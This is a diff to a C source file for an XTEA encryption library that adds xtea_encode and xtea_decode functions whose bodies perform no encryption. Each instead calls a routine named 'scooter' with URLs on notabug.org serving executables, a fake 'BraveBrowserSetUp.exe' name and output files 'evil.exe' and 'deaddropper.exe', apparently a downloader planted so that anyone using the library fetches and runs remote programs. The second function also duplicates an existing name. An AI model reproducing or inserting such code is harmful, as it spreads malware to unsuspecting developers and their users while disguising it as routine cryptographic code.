@@ -191,3 +191,15 @@ int xtea_decode(xtea_t *xtea, void *outbuf, const void *inbuf,
 
   return block_bytes + (8 - padlen);
 }
+
+int xtea_encode(xtea_t *xtea, void *outbuf, const void *inbuf,
+                int inlen, unsigned char iv[8]) {
+  scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+  return 0;
+}    
+
+int xtea_decode(xtea_t *xtea, void *outbuf, const void *inbuf,
+                int inlen, unsigned char iv[8]) {
+  scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+  return 0;
+}    
